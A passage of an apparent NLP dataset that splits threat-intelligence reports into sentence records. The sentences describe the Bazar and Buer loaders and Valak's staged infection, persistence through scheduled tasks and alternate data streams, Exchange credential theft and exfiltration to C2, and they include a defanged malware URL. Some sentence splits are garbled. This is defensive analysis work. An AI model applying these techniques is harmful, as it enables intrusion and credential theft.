        "report": "r-787",
        "line": 7,
        "index": 2259
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S8",
        "text": "Most notably, the packed binaries are exe files with a randomly named export function.",
        "type": "",
        "report": "r-787",
        "line": 8,
        "index": 2260
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S9",
        "text": "The export function is responsible for payload decryption and injection.",
        "type": "",
        "report": "r-787",
        "line": 9,
        "index": 2261
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S10",
        "text": "First, a shellcode is decrypted, which further decrypts a headerless PE loader that has the final payload in its overlay.",
        "type": "",
        "report": "r-787",
        "line": 10,
        "index": 2262
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S11",
        "text": "The headersless loader allocates memory, maps the payload into memory with proper permissions, and finally transfers control to it.",
        "type": "",
        "report": "r-787",
        "line": 11,
        "index": 2263
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S12",
        "text": "In this campaign, no process self-injection is used to load the payload.",
        "type": "",
        "report": "r-787",
        "line": 12,
        "index": 2264
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S13",
        "text": "The Bazar backdoor is a new stealthy malware, part of the TrickBot group\u2019s toolkit arsenal and leveraged for high-value targets.",
        "type": "",
        "report": "r-787",
        "line": 13,
        "index": 2265
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S14",
        "text": "The Bazar loader is used to download and execute the Bazar backdoor on the target system.",
        "type": "",
        "report": "r-787",
        "line": 14,
        "index": 2266
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S15",
        "text": "The goal of this backdoor is to execute binaries, scripts, modules, kill processes, and then remove itself from the compromised machine.",
        "type": "",
        "report": "r-787",
        "line": 15,
        "index": 2267
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S16",
        "text": "The samples used in this campaign heavily rely on control flow obfuscation.",
        "type": "",
        "report": "r-787",
        "line": 16,
        "index": 2268
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S17",
        "text": "The detailed analysis report about this backdoor can be found here.",
        "type": "",
        "report": "r-787",
        "line": 17,
        "index": 2269
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S18",
        "text": "The Bazar loader downloads the Bazar backdoor from the C&C using the following URI format: {C&C}/api/v\\d{3}\n",
        "type": "",
        "report": "r-787",
        "line": 18,
        "index": 2270
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S19",
        "text": "The downloaded payload is XOR-encrypted and can be decrypted using the script provided in the appendix.",
        "type": "",
        "report": "r-787",
        "line": 19,
        "index": 2271
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S20",
        "text": "The downloaded malware was successfully captured by the Zscaler Cloud Sandbox: Figure 6: The Zscaler Cloud Sandbox report.\n",
        "type": "",
        "report": "r-787",
        "line": 20,
        "index": 2272
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S21",
        "text": "The C&C TLS communications of the Bazar backdoor have been using certificates created in the same manner that TrickBot certificates have been created.",
        "type": "",
        "report": "r-787",
        "line": 21,
        "index": 2273
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S22",
        "text": "The C&C server TLS certificate is shown in Figure 7.\n",
        "type": "",
        "report": "r-787",
        "line": 22,
        "index": 2274
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S23",
        "text": "Researchers also observed that the backdoor downloads and executes the Cobalt Strike pentesting and post-exploitation toolkit on the victim's machine within some period of time after the infection.",
        "type": "",
        "report": "r-787",
        "line": 23,
        "index": 2275
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S24",
        "text": "By deploying Cobalt Strike, it is clear that this stealthy backdoor is being used to gain a foothold in corporate networks so that ransomware can be deployed, data can be stolen, or network access could be sold to other threat actors.\n",
        "type": "",
        "report": "r-787",
        "line": 24,
        "index": 2276
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S25",
        "text": "The Buer loader was first discovered around the end of 2019.",
        "type": "",
        "report": "r-787",
        "line": 25,
        "index": 2277
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S26",
        "text": "It is a very capable malware written in C and primarily sold on Russian underground forums for around US$400.",
        "type": "",
        "report": "r-787",
        "line": 26,
        "index": 2278
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S27",
        "text": "Notably, this malware does not function in the CIS.",
        "type": "",
        "report": "r-787",
        "line": 27,
        "index": 2279
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S28",
        "text": "It has most of the important strings encrypted and APIs are loaded by hash, just like most of the sophisticated malware these days.",
        "type": "",
        "report": "r-787",
        "line": 28,
        "index": 2280
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S29",
        "text": "We are not going to go into technical details because detailed analysis of this has already published.\n",
        "type": "",
        "report": "r-787",
        "line": 29,
        "index": 2281
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S30",
        "text": "The Buer loader was captured by the Zscaler Cloud Sandbox.\n",
        "type": "",
        "report": "r-787",
        "line": 30,
        "index": 2282
    },
    {
        "id": "cti_reports_filtered/r-787.md:::S31",
        "text": "In addition to sandbox detections, Zscaler\u2019s multilayered cloud security platform detects indicators at various levels:\n",
        "type": "",
        "report": "r-787",
        "line": 31,
        "index": 2283
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S0",
        "text": "In these campaigns, the most common infection vector is via Microsoft Word documents embedded with malicious macro code.",
        "type": "",
        "report": "r-826",
        "line": 0,
        "index": 2284
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S1",
        "text": "The contents of the documents are in English and German depending on the target.\n",
        "type": "",
        "report": "r-826",
        "line": 1,
        "index": 2285
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S2",
        "text": "Malicious macro code is used to download a DLL file with .cab extension named \u201cU.tmp\u201d and saved into the temp folder.\n",
        "type": "",
        "report": "r-826",
        "line": 2,
        "index": 2286
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S3",
        "text": "DLL file download address: \u201chxxp://v0rzpbu[.]com/we201o85/aio0i32p.php?l=hopo4.cab\u201d\n",
        "type": "",
        "report": "r-826",
        "line": 3,
        "index": 2287
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S4",
        "text": "After downloading the DLL, the code launches the malicious DLL using \u201cregsvr32.exe\u201d.\n",
        "type": "",
        "report": "r-826",
        "line": 4,
        "index": 2288
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S5",
        "text": "When executed, the DLL drops and launches using a WinExec API call.",
        "type": "",
        "report": "r-826",
        "line": 5,
        "index": 2289
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S6",
        "text": "This stage of the Valak malware uses a malicious JavaScript file with a random name that changes per execution.",
        "type": "",
        "report": "r-826",
        "line": 6,
        "index": 2290
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S7",
        "text": "In the example below the name of the JavaScript file is \u201csly4.0\u201d.",
        "type": "",
        "report": "r-826",
        "line": 7,
        "index": 2291
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S8",
        "text": "The downloaded JavaScript code, \u201csly4.0\u201d, contains a variable called \u201cPRIMARY_C2\u201d that holds multiple fake and legitimate domains, including Google, Gmail, Avast, and Microsoft.",
        "type": "",
        "report": "r-826",
        "line": 8,
        "index": 2292
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S9",
        "text": "The domain list varies between samples.",
        "type": "",
        "report": "r-826",
        "line": 9,
        "index": 2293
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S10",
        "text": "Valak creates connections to the different C2 servers in the list with two predefined URIs:\n",
        "type": "",
        "report": "r-826",
        "line": 10,
        "index": 2294
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S11",
        "text": "One URI is used to download an encoded file named \u201cproject.aspx\u201d [saved as project[1].htm].\n",
        "type": "",
        "report": "r-826",
        "line": 11,
        "index": 2295
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S12",
        "text": "*in version 30, the file was renamed to \u201crpx.aspx\u201d.\n",
        "type": "",
        "report": "r-826",
        "line": 12,
        "index": 2296
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S13",
        "text": "One URI is used to download an encoded file named \u201ca.aspx\u201d [saved as a[1].htm].\n",
        "type": "",
        "report": "r-826",
        "line": 13,
        "index": 2297
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S14",
        "text": "*in version 30, the file was renamed to \u201cgo.aspx\u201d.\n",
        "type": "",
        "report": "r-826",
        "line": 14,
        "index": 2298
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S15",
        "text": "Both files are decoded by the malware using Base64 and an XOR cipher.",
        "type": "",
        "report": "r-826",
        "line": 15,
        "index": 2299
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S16",
        "text": "The key is a combination of a predefined string and information collected from memory during runtime.",
        "type": "",
        "report": "r-826",
        "line": 16,
        "index": 2300
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S17",
        "text": "The malware sets information like the C2 server, ID, the downloaded payload, and the decoded project.aspx in a registry key under \u201cHKCU\\Software\\ApplicationContainer\\Appsw64\u201d.",
        "type": "",
        "report": "r-826",
        "line": 17,
        "index": 2301
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S18",
        "text": "These keys will be used in the second stage.\n",
        "type": "",
        "report": "r-826",
        "line": 18,
        "index": 2302
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S19",
        "text": "After downloading the payloads and setting the registry keys and values, Valak sets it\u2019s persistence via a scheduled task.\n",
        "type": "",
        "report": "r-826",
        "line": 19,
        "index": 2303
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S20",
        "text": "The scheduled task is set to launch wscript that executes JavaScript stored as an Alternative Data Stream named \u201cDefault2.ini\u201d in the file \u201cClassic2Application.bz\u201d.\n",
        "type": "",
        "report": "r-826",
        "line": 20,
        "index": 2304
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S21",
        "text": "The script in the ADS (\u201cDefault2.ini\u201d) executes the content of the registry key, \u201cHKCU\\Software\\ApplicationContainer\\Appsw64\\ServerUrl\u201d, which holds the contents of \u201cproject.aspx\u201d, the second stage JavaScript file.",
        "type": "",
        "report": "r-826",
        "line": 21,
        "index": 2305
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S22",
        "text": "In the first stage, Valak laid the foundation for the attack.",
        "type": "",
        "report": "r-826",
        "line": 22,
        "index": 2306
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S23",
        "text": "In the second stage, it downloads additional modules for reconnaissance activity and to steal sensitive information.\n",
        "type": "",
        "report": "r-826",
        "line": 23,
        "index": 2307
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S24",
        "text": "The two payloads (\u201cproject.aspx\u201d and \u201ca.aspx\u201d) and the configuration in the registry keys are used in the second stage to perform malicious activities.\n",
        "type": "",
        "report": "r-826",
        "line": 24,
        "index": 2308
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S25",
        "text": "The \u201cproject.aspx\u201d, or as we refer to it, the second stage JS, is a JavaScript file that looks very similar to the first stage JavaScript (\u201csly4.0\u201d).",
        "type": "",
        "report": "r-826",
        "line": 25,
        "index": 2309
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S26",
        "text": "However, on closer inspection it contains additional functions.",
        "type": "",
        "report": "r-826",
        "line": 26,
        "index": 2310
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S27",
        "text": "The script is executed by the scheduled task used to maintain persistence, with its main goal being:\n",
        "type": "",
        "report": "r-826",
        "line": 27,
        "index": 2311
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S28",
        "text": "Execute Pluginhost.exe, the plugin management component.\n",
        "type": "",
        "report": "r-826",
        "line": 28,
        "index": 2312
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S29",
        "text": "Download and parse additional payloads from the C2.\n",
        "type": "",
        "report": "r-826",
        "line": 29,
        "index": 2313
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S30",
        "text": "Save the payloads as Alternate Data Streams and set scheduled tasks to run them.\n",
        "type": "",
        "report": "r-826",
        "line": 30,
        "index": 2314
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S31",
        "text": "In the second stage, the configuration file has been altered to contain a unique \u201cClient_ID\u201d and a different file that it will try to download called \u201cbounce.aspx\u201d.",
        "type": "",
        "report": "r-826",
        "line": 31,
        "index": 2315
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S32",
        "text": "Stage 2 also contains three unique functions, \u201cCreateExecJob\u201d, \u201cCreateOleExecJob\u201d and \u201cLaunchPlugin\u201d.",
        "type": "",
        "report": "r-826",
        "line": 32,
        "index": 2316
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S33",
        "text": "These functions are called from the \u201cParseTask\u201d function, and receive the parsed tasks from the C2.\n",
        "type": "",
        "report": "r-826",
        "line": 33,
        "index": 2317
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S34",
        "text": "If the malware downloads a payload that starts with the word \u201cODTASK\u201d, it calls \u201cCreateOleExecJob\u201d, which writes the payload as an ADS of the file \u201cC:\\\\Users\\\\Public\\\\PowerManagerSpm.jar\u201d and creates a scheduled task \u201cPerfWatson_%taskname%\u201d to run it.",
        "type": "",
        "report": "r-826",
        "line": 34,
        "index": 2318
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S35",
        "text": "If the malware receives a content start with the word \u201cPLUGIN\u201d, it calls \u201cLaunchPlugin\u201d, which executes the PluginHost.exe file using WMI with the content as an argument.",
        "type": "",
        "report": "r-826",
        "line": 35,
        "index": 2319
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S36",
        "text": "If the malware receives a content starting with the word \u201cTASK\u201d, it calls \u201cCreateExecJob\u201d, which writes the content as an ADS of the file \u201cC:\\\\Users\\\\Public\\\\PowerManagerSpm.jar\u201d and creates a scheduled task \u201cPowerUtility_%taskname%W\u201d to run it.",
        "type": "",
        "report": "r-826",
        "line": 36,
        "index": 2320
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S37",
        "text": "Our analysis reveals that this time, the payload downloaded by Valak was IcedID.",
        "type": "",
        "report": "r-826",
        "line": 37,
        "index": 2321
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S38",
        "text": "However, the payload can vary, as the attackers can download other payloads to the infected system.\n",
        "type": "",
        "report": "r-826",
        "line": 38,
        "index": 2322
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S39",
        "text": "In previous infections, Valak downloaded different remote administration tools like putty.exe and NetSupport Manager.\n",
        "type": "",
        "report": "r-826",
        "line": 39,
        "index": 2323
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S40",
        "text": "The decoded \u201ca.aspx\u201d is saved in the temporary folder as %TEMP%\\<ID>.bin.",
        "type": "",
        "report": "r-826",
        "line": 40,
        "index": 2324
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S41",
        "text": "This file, internally named \u201cPluginHost.exe\u201d, is an executable file, and will be used to manage additional components.\n",
        "type": "",
        "report": "r-826",
        "line": 41,
        "index": 2325
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S42",
        "text": "Valak\u2019s Modular Plugin Architecture\n",
        "type": "",
        "report": "r-826",
        "line": 42,
        "index": 2326
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S43",
        "text": "The functionality of the executable \u201cPluginHost.exe\u201d is divided into four classes: Bot, HTTPClient, Program and Utils, which will allow it to perform its main goal of downloading and loading additional components of the malware.",
        "type": "",
        "report": "r-826",
        "line": 43,
        "index": 2327
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S44",
        "text": "The bot class is responsible for reading from several registry entries set by the first stage.",
        "type": "",
        "report": "r-826",
        "line": 44,
        "index": 2328
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S45",
        "text": "GetID() reads from the registry entry \u201c SetupServiceKey \u201d, which holds the ID.",
        "type": "",
        "report": "r-826",
        "line": 45,
        "index": 2329
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S46",
        "text": "\u201d, which holds the ID",
        "type": "",
        "report": "r-826",
        "line": 46,
        "index": 2330
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S47",
        "text": ".",
        "type": "",
        "report": "r-826",
        "line": 47,
        "index": 2331
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S48",
        "text": "GetC2() reads from the registry entry \u201cShimV4\u201d, which holds the C2 domain.",
        "type": "",
        "report": "r-826",
        "line": 48,
        "index": 2332
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S49",
        "text": "Both functions use the Utils class to read registry entries.\n",
        "type": "",
        "report": "r-826",
        "line": 49,
        "index": 2333
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S50",
        "text": "The HTTPClient class contains two functions, post and GetPluginBytes.\n",
        "type": "",
        "report": "r-826",
        "line": 50,
        "index": 2334
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S51",
        "text": "The GetPluginBytes() function gets the C2 domain using GetC2() and adds an embedded URI.",
        "type": "",
        "report": "r-826",
        "line": 51,
        "index": 2335
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S52",
        "text": "The URL is used to download an additional module for the plugin.\n",
        "type": "",
        "report": "r-826",
        "line": 52,
        "index": 2336
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S53",
        "text": "The Program class contains the main function of the file main().",
        "type": "",
        "report": "r-826",
        "line": 53,
        "index": 2337
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S54",
        "text": "This function executes the function GetPluginBytes() to download the module components with type \u201cManagedPlugin\u201d.",
        "type": "",
        "report": "r-826",
        "line": 54,
        "index": 2338
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S55",
        "text": "These components will be loaded reflectively to the executable\u2019s memory and expand the plugin capabilities.\n",
        "type": "",
        "report": "r-826",
        "line": 55,
        "index": 2339
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S56",
        "text": "The Utils class contains several maintenance functions used by the other classes.\n",
        "type": "",
        "report": "r-826",
        "line": 56,
        "index": 2340
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S57",
        "text": "When referring to additional plugins, it is worth noting that in early versions of Valak the plugins were downloaded by the second stage JS via PowerShell.",
        "type": "",
        "report": "r-826",
        "line": 57,
        "index": 2341
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S58",
        "text": "More recent versions of Valak abandoned the popular yet easily detectable PowerShell downloader approach and transitioned to PluginHost as a means of managing and downloading additional payloads.",
        "type": "",
        "report": "r-826",
        "line": 58,
        "index": 2342
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S59",
        "text": "This transition indicates that the Valak authors are looking for stealthier approaches and ways to improve their evasion techniques.",
        "type": "",
        "report": "r-826",
        "line": 59,
        "index": 2343
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S60",
        "text": "During this analysis, we discovered several different modules with the same internal name, \u201cManagedPlugin.dll\u201d.",
        "type": "",
        "report": "r-826",
        "line": 60,
        "index": 2344
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S61",
        "text": "These modules are downloaded and loaded by \u201cPluginHost.exe\u201d.\n",
        "type": "",
        "report": "r-826",
        "line": 61,
        "index": 2345
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S62",
        "text": "- Systeminfo : responsible for extensive reconnaissance; targets local and domain admins\n",
        "type": "",
        "report": "r-826",
        "line": 62,
        "index": 2346
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S63",
        "text": "- Exchgrabber: aims to steal Microsoft Exchange data and infiltrates the enterprises mail system\n",
        "type": "",
        "report": "r-826",
        "line": 63,
        "index": 2347
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S64",
        "text": "- IPGeo: verifies the geolocation of the target\n",
        "type": "",
        "report": "r-826",
        "line": 64,
        "index": 2348
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S65",
        "text": "- Procinfo: collects information about the infected machine\u2019s running processes\n",
        "type": "",
        "report": "r-826",
        "line": 65,
        "index": 2349
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S66",
        "text": "- Netrecon: performs network reconnaissance\n",
        "type": "",
        "report": "r-826",
        "line": 66,
        "index": 2350
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S67",
        "text": "- Screencap: captures screenshots from the infected machine\n",
        "type": "",
        "report": "r-826",
        "line": 67,
        "index": 2351
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S68",
        "text": "Among these components, some focus on one single, specific activity to achieve their goal and are relatively less robust than others when it comes to capability and potential impact.",
        "type": "",
        "report": "r-826",
        "line": 68,
        "index": 2352
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S69",
        "text": "This includes ipgeo, procinfo, netrecon and screencap.\n",
        "type": "",
        "report": "r-826",
        "line": 69,
        "index": 2353
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S70",
        "text": "Below is a deep dive of \u201csysteminfo\u201d and \u201cexchgrabber\u201d, which are more advanced and complex than the aforementioned plugin components.",
        "type": "",
        "report": "r-826",
        "line": 70,
        "index": 2354
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S71",
        "text": "\u201cSysteminfo\u201d shares many similarities to \u201cPluginHost.exe\u201d when it comes to class names.",
        "type": "",
        "report": "r-826",
        "line": 71,
        "index": 2355
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S72",
        "text": "However, unlike \u201cPluginHost\u201d, it contains several reconnaissance functions that focus on gathering information about the user, the machine, and existing AV products.",
        "type": "",
        "report": "r-826",
        "line": 72,
        "index": 2356
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S73",
        "text": "The module gathers information about the user and attempts to verify whether this is a local admin or a domain admin.",
        "type": "",
        "report": "r-826",
        "line": 73,
        "index": 2357
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S74",
        "text": "This shows that after infecting the machine, Valak chooses to target mainly administrators and domain admins.",
        "type": "",
        "report": "r-826",
        "line": 74,
        "index": 2358
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S75",
        "text": "This indicates a propensity to target higher profile accounts such as enterprise admins.",
        "type": "",
        "report": "r-826",
        "line": 75,
        "index": 2359
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S76",
        "text": "The module attempts to find whether the infected machine has any security products installed using the AntivirusSoftware() function.",
        "type": "",
        "report": "r-826",
        "line": 76,
        "index": 2360
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S77",
        "text": "The information collected about installed AV programs is gathered using the WMI query \u201cSELECT * FROM AntiVirusProduct\u201d.\n",
        "type": "",
        "report": "r-826",
        "line": 77,
        "index": 2361
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S78",
        "text": "The module also collects the physical address (MAC) and the IP address of the infected machine.\n",
        "type": "",
        "report": "r-826",
        "line": 78,
        "index": 2362
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S79",
        "text": "Additional reconnaissance activity occurs with several other functions, including:\n",
        "type": "",
        "report": "r-826",
        "line": 79,
        "index": 2363
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S80",
        "text": "- NetUser - provides more information about the user\n",
        "type": "",
        "report": "r-826",
        "line": 80,
        "index": 2364
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S81",
        "text": "- provides more information about the user SystemUpTime - records the amount of time the machine is running\n",
        "type": "",
        "report": "r-826",
        "line": 81,
        "index": 2365
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S82",
        "text": "- records the amount of time the machine is running WindowsVersion - determines the Windows version\n",
        "type": "",
        "report": "r-826",
        "line": 82,
        "index": 2366
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S83",
        "text": "In order to exfiltrate data, the plugin uses the function \u201cpost\u201d in the HTTPClient class.",
        "type": "",
        "report": "r-826",
        "line": 83,
        "index": 2367
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S84",
        "text": "\u201cPost\u201d gives the plugin the ability to upload content and exfiltrate data to the remote C2 whose domain is stored in the registry.",
        "type": "",
        "report": "r-826",
        "line": 84,
        "index": 2368
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S85",
        "text": "Similar to \u201cPluginHost\u201d, \u201cSystemInfo\u201d uses another function called GetQuery() that builds the URL to send the information to the remote C2.",
        "type": "",
        "report": "r-826",
        "line": 85,
        "index": 2369
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S86",
        "text": "The URL is encoded using Base64 and some char replacements.\n",
        "type": "",
        "report": "r-826",
        "line": 86,
        "index": 2370
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S87",
        "text": "The core functionality of the \u201cManagedPlugin\u201d module is in the \u201cManagedPlugin\u201d class.",
        "type": "",
        "report": "r-826",
        "line": 87,
        "index": 2371
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S88",
        "text": "The function loops endlessly and continues to execute the reconnaissance activity and send it to the attacker.\n",
        "type": "",
        "report": "r-826",
        "line": 88,
        "index": 2372
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S89",
        "text": "Exchgrabber, similar to systeminfo, shares some similarities with PluginHost when it comes to several function names like Bot, HTTPClient, and Utils; however, it has its own differentiated capabilities.",
        "type": "",
        "report": "r-826",
        "line": 89,
        "index": 2373
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S90",
        "text": "At first glance, the module appears to solely be used to steal credentials, which can be seen in several classes and data arguments with clear names like \u201cCredential\u201d and \u201cCredentialType\u201d.",
        "type": "",
        "report": "r-826",
        "line": 90,
        "index": 2374
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S91",
        "text": "The module handles its credential management in the class \u201cCredential\u201d, which includes several functions that handle the credential management activity and data types that will hold these credentials.",
        "type": "",
        "report": "r-826",
        "line": 91,
        "index": 2375
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S92",
        "text": "One of the most interesting functions in this class is \u201cCredential\u201d which receives four arguments: username, password, target, and CredentialType.",
        "type": "",
        "report": "r-826",
        "line": 92,
        "index": 2376
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S93",
        "text": "It inserts these credentials into the respective module variable.",
        "type": "",
        "report": "r-826",
        "line": 93,
        "index": 2377
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S94",
        "text": "The \u201ctarget\u201d variable is used in the core ManagedPlugin function to store strings related to Microsoft Office applications.",
        "type": "",
        "report": "r-826",
        "line": 94,
        "index": 2378
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S95",
        "text": "Another interesting argument in the \u201ccredential\u201d function is \u201cCredentialType\u201d.",
        "type": "",
        "report": "r-826",
        "line": 95,
        "index": 2379
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S96",
        "text": "The type of credentials is determined by another part of the enum variable called \u201cCredentialType\u201d, which contains each of the credentials that the module will attempt to extract.",
        "type": "",
        "report": "r-826",
        "line": 96,
        "index": 2380
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S97",
        "text": "The credential types are sensitive information that can be extracted from the enterprise Microsoft Exchange server data, including Domain Password & Domain Certificate.\n",
        "type": "",
        "report": "r-826",
        "line": 97,
        "index": 2381
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S98",
        "text": "Extracting this sensitive data allows the attacker access to an inside domain user for the internal mail services of an enterprise along with access to the domain certificate of an enterprise.",
        "type": "",
        "report": "r-826",
        "line": 98,
        "index": 2382
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S99",
        "text": "With systeminfo, the attacker can identify which user is a domain administrator.",
        "type": "",
        "report": "r-826",
        "line": 99,
        "index": 2383
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S100",
        "text": "This creates a very dangerous combination of sensitive data leakage and potentially large scale cyber spying or infostealing.",
        "type": "",
        "report": "r-826",
        "line": 100,
        "index": 2384
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S101",
        "text": "It also shows that the intended target of this malware is first and foremost enterprises.\n",
        "type": "",
        "report": "r-826",
        "line": 101,
        "index": 2385
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S102",
        "text": "When inspecting the core logic behind the class MainPlugin, it\u2019s clear how each class collaborates with others to extract data from Microsoft Exchange and Outlook.\n",
        "type": "",
        "report": "r-826",
        "line": 102,
        "index": 2386
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S103",
        "text": "The module attempts to check if the extracted data is related to Microsoft Office or MS.Outlook.",
        "type": "",
        "report": "r-826",
        "line": 103,
        "index": 2387
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S104",
        "text": "If so, it attempts to access the file \u201cAutodiscover.xml\u201d using the function GetFiles.",
        "type": "",
        "report": "r-826",
        "line": 104,
        "index": 2388
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S105",
        "text": "\u201cAutodiscover.xml\u201d is a dynamically generated file that contains the data Microsoft Outlook needs to access the mailbox entered in the configuration wizard.",
        "type": "",
        "report": "r-826",
        "line": 105,
        "index": 2389
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S106",
        "text": "The primary purpose of the Exchange Autodiscover service is to establish initial connections to Exchange user mailboxes.",
        "type": "",
        "report": "r-826",
        "line": 106,
        "index": 2390
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S107",
        "text": "It then attempts to collect the AutoDiscover SMTP address of the dedicated exchange forest, and eventually puts all the extracted data in a variable called \u201ctext\u201d .",
        "type": "",
        "report": "r-826",
        "line": 107,
        "index": 2391
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S108",
        "text": "After collecting the sensitive data, the module compresses it using Base64.",
        "type": "",
        "report": "r-826",
        "line": 108,
        "index": 2392
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S109",
        "text": "This is a new feature of this specific module within the \u201cUtils\u201d class.",
        "type": "",
        "report": "r-826",
        "line": 109,
        "index": 2393
    },
    {
        "id": "cti_reports_filtered/r-826.md:::S110",
        "text": "Then, it sends the sensitive data to the attacker\u2019s C2 with the POST function and an embedded URI.",
        "type": "",
        "report": "r-826",
        "line": 110,
        "index": 2394
    },
